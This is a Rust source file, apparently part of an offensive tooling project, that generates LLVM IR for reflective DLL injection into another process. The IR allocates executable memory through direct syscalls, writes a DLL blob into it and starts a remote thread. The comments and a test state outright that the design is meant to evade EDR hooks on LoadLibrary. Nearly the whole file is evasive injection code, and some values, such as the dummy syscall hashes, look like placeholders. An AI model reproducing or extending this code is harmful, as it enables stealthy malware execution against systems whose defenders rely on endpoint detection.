/// Reflective DLL injection IR emitter.
///
/// Reflective injection loads a DLL entirely from memory without touching the
/// file system or calling LoadLibrary (which is hooked by EDRs).  The DLL
/// contains a `ReflectiveLoader` export that bootstraps itself: it resolves
/// the PE base from its own stack frame, walks the PEB for kernel32/ntdll,
/// performs relocations, resolves imports, and calls DllMain.
///
/// This module emits the orchestration IR that:
///   1. Allocates RWX memory in the target process via direct syscall.
///   2. Copies the DLL blob into the allocated region.
///   3. Locates the `ReflectiveLoader` export offset within the blob.
///   4. Creates a remote thread at that offset via direct syscall.

pub struct ReflectiveInject;

impl ReflectiveInject {
    /// Emit LLVM IR for the reflective injection orchestrator.
    pub fn emit_ir() -> String {
        r#"; ============================================================
; jocky_reflective_inject — load DLL from memory in target
; ============================================================
define i32 @jocky_reflective_inject(
    i8* %target_proc,   ; handle to target process
    i8* %dll_base,      ; pointer to DLL blob in our process
    i64 %dll_size       ; size of DLL blob
) {
entry:
  ; SSN resolution
  %ssn_h_alloc = add i64 0, 111111111
  %ssn_alloc   = call i32 @jocky_resolve_ssn(i64 %ssn_h_alloc)
  %ssn_h_write = add i64 0, 222222222
  %ssn_write   = call i32 @jocky_resolve_ssn(i64 %ssn_h_write)
  %ssn_h_thread = add i64 0, 333333333
  %ssn_thread  = call i32 @jocky_resolve_ssn(i64 %ssn_h_thread)

  ; Step 1: allocate RWX memory in target (PAGE_EXECUTE_READWRITE = 0x40)
  %remote_base = alloca i64, align 8
  store i64 0, i64* %remote_base
  %alloc_size = alloca i64, align 8
  store i64 %dll_size, i64* %alloc_size
  %alloc_ret = call i32 @jocky_direct_syscall(
    i32 %ssn_alloc,
    i8* %target_proc,
    i64* %remote_base,
    i64 0,
    i64* %alloc_size,
    i32 12288,
    i32 64
  )
  %remote_ptr = load i64, i64* %remote_base

  ; Step 2: write DLL blob into remote allocation
  %bytes_written = alloca i64, align 8
  %write_ret = call i32 @jocky_direct_syscall(
    i32 %ssn_write,
    i8* %target_proc,
    i64 %remote_ptr,
    i8* %dll_base,
    i64 %dll_size,
    i64* %bytes_written
  )

  ; Step 3: find ReflectiveLoader export offset within the blob
  %loader_offset = call i64 @jocky_find_reflective_loader(i8* %dll_base, i64 %dll_size)

  ; Step 4: create remote thread at ReflectiveLoader
  %thread_handle = alloca i8*, align 8
  %thread_addr   = add i64 %remote_ptr, %loader_offset
  %create_ret = call i32 @jocky_direct_syscall(
    i32 %ssn_thread,
    i8* %target_proc,
    i8** %thread_handle,
    i64 %thread_addr,
    i8* null
  )

  ret i32 0
}
"#.to_string()
    }

    /// Emit declarations for helpers used by the injector.
    pub fn emit_declarations() -> String {
        "declare i64 @jocky_find_reflective_loader(i8*, i64)\n".to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_emit_ir_has_all_steps() {
        let ir = ReflectiveInject::emit_ir();
        assert!(ir.contains("jocky_reflective_inject"), "function defined");
        assert!(ir.contains("jocky_find_reflective_loader"), "loader search step");
        assert!(ir.contains("ret i32 0"), "returns");
    }

    #[test]
    fn test_no_loadlibrary_call() {
        let ir = ReflectiveInject::emit_ir();
        assert!(!ir.contains("LoadLibrary"), "must not call LoadLibrary — EDR hooks it");
    }
}
